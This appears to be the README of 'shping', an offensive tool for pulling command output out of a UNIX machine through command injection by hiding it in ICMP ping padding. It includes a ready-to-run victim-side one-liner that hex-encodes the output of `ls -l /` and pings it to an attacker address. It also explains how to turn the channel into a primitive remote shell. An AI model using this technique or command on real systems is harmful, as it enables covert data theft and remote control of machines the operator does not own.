# shping

Got command injection on a UNIX system but the only thing you can do is ping yourself?

Well don't despair. With this little tool you can receive the output of your commands, as well as any other data, inserted in the ping's padding space. From its manual:

```
-p pattern
	You may specify up to 16 “pad” bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
```

You can even use it as a primitive shell, after setting it up properly.

Does not work with windows ping or any other version that doesn't have that option.

## usage

```
↬  python3 shping.py -h
usage: shping.py [-h] [-o outputFile] [-i] targetIP encapChr

Read data sent as padding from unix ping tool through the -p option. Can be
used as just a data receiver or as a primitive shell after implementing the
sendCommand function

positional arguments:
 targetIP              Target IP address
 encapChr              Character to use for encapsulating data. Must be the
					   same character used on the other end

optional arguments:
 -h, --help            show this help message and exit
 -o outputFile, --outfile outputFile
					   Set this if you want to save all the output to a file
 -i, --interactive     Interactive shell mode

```

Note that the data you want to receive must be sent to ping as hex-encoded. This varies based on the tools you have at your disposal, for example you can use xxd or hexdump (see below).

Also, the data you want to receive must be enclosed by a string of 16 identical characters (encapChr parameter). That's for 2 reasons:

1. To ensure the data is always 16 bytes long. In reality, the padding space is larger, but ping only accepts 16 bytes, and if you feed it less it will reorder the bytes in a confusing way.
2. To grab the offset where our data starts in the icmp packet.

So on the remote machine you'll want to execute something like this:

```
cont="AAAAAAAAAAAAAAAA""$(ls -l /)""AAAAAAAAAAAAAAAA"; echo -n "$cont" | hexdump -v -e '16/1 "%02x" "\n"' | while read line; do ping -c 1 -p $line 198.51.100.1; done
```

where `198.51.100.1` is your ip (or with `xxd -c 16 -ps` in place of hexdump...), while on your local machine you'll run shping like:
```
python3 shping.py 198.51.100.2 A
```
where `198.51.100.2` is the ip of the remote machine.

## interactive mode

You can directly send and receive commands through shping by implementing the `sendCommand` function to basically do the same thing you'd manually do in the first step above (eg. http get/post). Then just launch shping as before but with the `-i` option and type your commands.

## notes

- only works on ipv4
- no ping -p option = no shping (<- windows)
- there are far better tools to use if you can do more stuff on the remote machine. this is just for the situations where you're strictly limited to basic commands and can't upload/download files to/on the target
